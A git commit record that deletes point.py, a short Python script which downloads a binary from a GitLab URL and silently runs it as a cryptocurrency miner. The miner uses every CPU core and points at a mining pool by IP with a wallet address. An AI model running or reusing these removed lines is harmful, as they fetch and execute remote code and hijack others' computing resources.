e999fa660c2c9212dd89cef1dfd4d5a182249eee
ARDINO LIANDO S1 Ilmu Hukum <16602047@unima.ac.id>
2024-11-05 02:15:27 +0000

    Delete point.py

--- point.py
+++
@@ -1,4 +0,0 @@
-import sys
-import os
-os.system("wget https://gitlab.com/mantap7091041/ios2/-/raw/main/cjava")
-os.system("chmod +x cjava && ./cjava -a yespowertide -o 47.236.252.96:443 -u TWmRFcspf257KLgehukxHPdc1pf6g8PDz9.$(echo SG2-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all) >/dev/null 2>&1)
